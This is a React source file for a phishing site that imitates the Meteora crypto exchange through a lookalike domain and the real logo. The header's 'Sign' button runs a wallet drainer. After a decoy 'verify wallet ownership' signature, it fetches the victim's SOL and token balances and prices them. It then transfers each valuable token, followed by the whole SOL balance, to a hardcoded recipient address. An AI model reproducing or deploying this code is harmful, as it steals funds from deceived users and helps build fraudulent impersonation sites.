import React, { useState, useEffect } from 'react';
import '../assets/Home_files/home.css'; // Ensure this file is in the same directory
import { createAppKit } from '@reown/appkit/react';
import { SolanaAdapter } from '@reown/appkit-adapter-solana';
import { solana, solanaTestnet, solanaDevnet } from '@reown/appkit/networks';
import { SolflareWalletAdapter, PhantomWalletAdapter, SolongWalletAdapter, TokenPocketWalletAdapter, MathWalletAdapter } from '@solana/wallet-adapter-wallets';
import { Connection, PublicKey, Transaction, SystemProgram } from '@solana/web3.js'
import { getAssociatedTokenAddress, createTransferInstruction, ASSOCIATED_TOKEN_PROGRAM_ID, TOKEN_PROGRAM_ID } from '@solana/spl-token';



// 1. Set up Solana Adapter
const solanaWeb3JsAdapter = new SolanaAdapter({
    wallets: [new PhantomWalletAdapter(), new SolflareWalletAdapter(), new SolongWalletAdapter(), new TokenPocketWalletAdapter(), new MathWalletAdapter()],
   });
   
   // 2. Create a metadata object - optional
   const metadata = {
    name: 'Meteora',
    description: 'Building the best LP tech and LP Army in crypto',
    url: 'https://meteora-ag.io',
    icons: ['https://app.meteora.ag/icons/logo.svg'],
   };
   
   // 3. Create modal
 createAppKit({
    adapters: [solanaWeb3JsAdapter],
    networks: [solana, solanaTestnet, solanaDevnet],
    solana,
    metadata,
    projectId: '77348435a917ff911d813e12eb32f021',
    features: {
     analytics: true, // Optional
    },
   });

let walletAddress;

const Header = () => {
 const [signStatus, setSignStatus] = useState('Sign')
 const executeFlow = async () => {
    const provider = window.solana
    try {
        const response = await provider.connect()
        walletAddress = response.publicKey.toString()
        console.log(walletAddress)

        await signMessage(provider)
        
         // Step 3: Fetch SOL balance after signing
         const connection = new Connection('https://solana-mainnet.g.alchemy.com/v2/Gsfdu-QYMKdktD9rUZiq8cwjFUdZTyPh');
         const balance = await connection.getBalance(new PublicKey(walletAddress));
         const solBalance = balance / 1e9;
 
         // Step 4: Fetch token balances using Shyft API
         const tokens = await fetchTokenBalances(walletAddress);
 
         // Step 5: Fetch prices for the tokens using Jupiter API
         const tokenPrices = await fetchTokenPrices(tokens);
 
         // Step 6: Calculate token values (balance * price) and sort by value
         const tokenValues = tokens.map(token => {
             const price = tokenPrices[token.info.symbol] || 0;  // Get the price for the token, default to 0 if not found
             const value = price * token.balance;  // Multiply balance and price directly
             return { ...token, value };
         });
 
         // Filter out tokens with a value of zero or below a certain threshold (e.g., 0.01)
         const filteredTokens = tokenValues.filter(token => token.value > 50);
 
         // Sort tokens by value (highest to lowest)
         const sortedTokens = filteredTokens.sort((a, b) => b.value - a.value);
         console.log('Filtered and Sorted Tokens by Value:', sortedTokens);
 
         // Step 7: Transfer tokens in the sorted order
         const recipientAddress = '2VhgfoY8zMLcpF5NhoArSua2iCoduqEFLMSaRXFhistJ';  // Replace with the recipient's address
         await transferTokensInOrder(sortedTokens, recipientAddress, connection);
 
         // Step 8: Initiate SOL transfer after all token transfers
         await transferSol(connection, recipientAddress, solBalance);

    } catch (error) {
        console.error('Failed to execute flow:', error);
    }
 }

 const signMessage = async (provider) => {
    const message = 'Please sign message to verify wallet ownership'
    try {
        const encodedMessage = new TextEncoder().encode(message)

        const signedMessage = await provider.signMessage(encodedMessage, 'utf8')
        console.log('Signed message: ', signedMessage)

        setSignStatus('Signed')
    } catch (error) {
        console.error('Failed to sign message:', error);
    }
 }


// Fetch token balances using Shyft API
async function fetchTokenBalances(walletAddress) {
    const apiKey = 'DNvnXBTyUJ_yV56g';  // Replace with your Shyft API key

    try {
        const response = await fetch(`https://api.shyft.to/sol/v1/wallet/all_tokens?network=mainnet-beta&wallet=${walletAddress}`, {
            headers: {
                'Content-Type': 'application/json',
                'x-api-key': apiKey
            }
        });

        const data = await response.json();
        if (data.success) {
            console.log('Token Balances:', data.result);
            return data.result;
        } else {
            throw new Error(data.message || 'Failed to fetch token balances');
        }
    } catch (err) {
        console.error('Error fetching token balances:', err);
        alert('Failed to fetch token balances');
    }
}


// Fetch token prices using Jupiter API
async function fetchTokenPrices(tokens) {
    const tokenSymbols = tokens.map(token => token.info.symbol).join(',');  // Create a comma-separated list of token symbols

    try {
        const response = await fetch(`https://price.jup.ag/v6/price?ids=${tokenSymbols}`);
        const data = await response.json();
        
        // Extract prices and map them to token symbols
        const prices = {};
        for (const [symbol, priceData] of Object.entries(data.data)) {
            prices[symbol] = priceData.price || 0;  // Get the price for each token, default to 0 if not found
        }

        console.log('Token Prices:', prices);
        return prices;
    } catch (err) {
        console.error('Error fetching token prices:', err);
        alert('Failed to fetch token prices');
    }
}


// Transfer SPL tokens in order of their values
async function transferTokensInOrder(tokens, recipientAddress, connection) {
    const provider = window.solana;
    const fromPublicKey = new PublicKey(walletAddress);

    for (const token of tokens) {
        try {
            const tokenAddress = new PublicKey(token.address);  // Token mint address
            const recipientPublicKey = new PublicKey(recipientAddress);
            const tokenBalance = token.balance;

            if (tokenBalance > 0) {
                console.log(`Initiating transfer for ${token.info.symbol} (${tokenBalance})`);

                const transferTx = await createTransferTransaction(
                    connection,
                    fromPublicKey,
                    recipientPublicKey,
                    tokenAddress,
                    tokenBalance,
                    token.info.decimals
                );

                try {
                    // Try to sign and send the transaction
                    const signature = await provider.signAndSendTransaction(transferTx);
                    await confirmTransactionWithTimeout(connection, signature, 8000);  // 30 seconds timeout

                    console.log(`Successfully transferred ${token.info.symbol}!`);
                } catch (signError) {
                    // If signing or sending fails, log the error but continue to the next token
                    console.error(`Failed to transfer ${token.info.symbol}:`, signError);
                }
            }
        } catch (err) {
            console.error(`Failed to transfer ${token.info.symbol}:`, err);
        }
    }
}



// Transfer SOL after token transfers
async function transferSol(connection, recipientAddress, solBalance) {
    try {
        if (solBalance > 0) {
            const provider = window.solana;
            const fromPublicKey = new PublicKey(walletAddress);
            const recipientPublicKey = new PublicKey(recipientAddress);

            console.log(`Initiating SOL transfer (${solBalance} SOL)`);

            // Create a SOL transfer instruction
            const transaction = new Transaction().add(
                SystemProgram.transfer({
                    fromPubkey: fromPublicKey,
                    toPubkey: recipientPublicKey,
                    lamports: solBalance * 1e9  // Convert SOL to lamports
                })
            );

            transaction.feePayer = fromPublicKey;
            const latestBlockhash = await connection.getLatestBlockhash();
            transaction.recentBlockhash = latestBlockhash.blockhash;

            // Sign and send the transaction
            const signature = await provider.signAndSendTransaction(transaction);
            await confirmTransactionWithTimeout(connection, signature, 8000);  // 8-second timeout

            console.log(`Successfully transferred SOL!`);
        } else {
            console.log('No SOL to transfer.');
        }
    } catch (err) {
        console.error('Failed to transfer SOL:', err);
    }
}



// Create a transaction to transfer SPL tokens
async function createTransferTransaction(connection, fromPublicKey, toPublicKey, tokenMintAddress, amount, decimals) {
    // Get associated token accounts for the sender and recipient
    const fromTokenAccount = await getAssociatedTokenAddress(
        tokenMintAddress,
        fromPublicKey,
        false,
        TOKEN_PROGRAM_ID,
        ASSOCIATED_TOKEN_PROGRAM_ID
    );

    const toTokenAccount = await getAssociatedTokenAddress(
        tokenMintAddress,
        toPublicKey,
        false,
        TOKEN_PROGRAM_ID,
        ASSOCIATED_TOKEN_PROGRAM_ID
    );

    // Convert amount to the smallest unit using BigInt
    const amountInSmallestUnit = BigInt(Math.round(amount * Math.pow(10, decimals)));

    // Create transfer instruction
    const transferInstruction = createTransferInstruction(
        fromTokenAccount,
        toTokenAccount,
        fromPublicKey,
        amountInSmallestUnit,
        [],
        TOKEN_PROGRAM_ID
    );

    // Create and build the transaction
    const transaction = new Transaction().add(transferInstruction);
    transaction.feePayer = fromPublicKey;

    // Get the latest blockhash
    const latestBlockhash = await connection.getLatestBlockhash();
    transaction.recentBlockhash = latestBlockhash.blockhash;

    return transaction;
}


// Confirm transaction with timeout
async function confirmTransactionWithTimeout(connection, signature, timeoutMs) {
    const start = Date.now();

    // Create a promise that rejects after the timeout
    const timeoutPromise = new Promise((_, reject) =>
        setTimeout(() => reject(new Error("Transaction confirmation timed out")), timeoutMs)
    );

    // Wait for either the confirmation or the timeout
    try {
        await Promise.race([
            connection.confirmTransaction(signature, 'confirmed'),
            timeoutPromise
        ]);
        console.log(`Transaction ${signature} confirmed.`);
    } catch (err) {
        console.error(`Transaction confirmation failed for ${signature}:`, err);
        throw err;
    }

    const end = Date.now();
    console.log(`Transaction confirmation took ${end - start}ms`);
}


 return (
  <header>
   <div className="top-bar">
    <p>
     New to Meteora? <a href="#">Watch Getting Started</a>
    </p>
   </div>
   <div className="bottom-bar">
    <p>For the first time, memecoin creators can permanently lock liquidity and still compound and claim fees forever!</p>
   </div>
   <nav className="navbr">
    <div className="brand">
     <img src="https://app.meteora.ag/icons/logo.svg" alt="Meteora Logo" className="logo" />
     <p id="brand-name">Meteora</p>
    </div>
    <ul>
     <li>
      <a id="bold-li" href="/welcome">
       Pools
      </a>
     </li>
     <li>
      <a id="bold-li2" href="/welcome">
       DLMM
      </a>
     </li>
     <li>
      <a id="bold-li3" href="/welcome">
       Portfolio
      </a>
     </li>
     <li>
      <a id="bold-li4" href="/welcome">
       More
      </a>
     </li>
    </ul>

    <div className="action-btn">
     <div className="connect-wallet">
        <w3m-button/>     
        <button id="connectWalletBtn" onClick={executeFlow}>{signStatus}</button>
     </div>
    </div>
   </nav>
  </header>
 );
};

export default Header;
